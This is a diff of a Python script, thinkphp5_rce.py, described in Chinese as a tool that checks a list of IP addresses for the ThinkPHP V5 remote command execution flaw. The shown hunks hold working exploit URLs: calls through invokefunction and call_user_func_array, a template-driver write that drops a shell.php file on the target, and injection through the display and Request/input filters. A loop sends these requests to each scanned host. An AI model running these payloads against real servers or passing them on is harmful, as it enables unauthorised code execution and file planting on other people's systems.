@@ -4,7 +4,7 @@
 # Author: Sandy Li
 # Created Time : Thu 24 Jan 2019 06:52:37 PM CST
 # File Name: thinkphp5_rce.py
-# Description:
+# Description:检测IP列表是否存在ThinkPHPV5*远程命令执行漏洞
 """
 import  threading, sys, time, random, socket, subprocess, re, os, struct, array
 import requests
@@ -91,9 +91,8 @@ def thinkphp_testing(aname):
                 r"public/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                 r"public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
                 r"public/index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E",
-                r"public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1"]
-        for i in range(1,5):
-
+                r"public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1"]        
+        for i in range(1,6):
             url = "http://" + ip_scaned + "/" + payloads[i]
             headers = {'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'}
             r = requests.get(url, headers=headers, verify=False, timeout=5)
